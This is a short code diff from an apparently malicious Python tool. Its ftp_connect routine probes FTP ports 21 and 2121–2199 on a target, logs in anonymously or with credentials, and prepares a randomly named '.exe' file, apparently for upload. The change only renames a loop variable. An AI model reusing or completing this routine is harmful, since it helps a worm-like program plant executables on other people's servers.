@@ -59,9 +59,9 @@ def ftp_connect(ip, user, pwd, anonymous=False):
         ftp = ftplib.FTP(timeout=2)
         ports = [21]
         ports.extend(range(2121,2200))
-        for port in ports:
+        for p in ports:
             try:
-                ftp.connect(ip, port=port)
+                ftp.connect(ip, port=p)
                 if anonymous: ftp.login()
                 else: ftp.login(user, pwd)
                 random_name = f'{generate_random_name()}.exe'
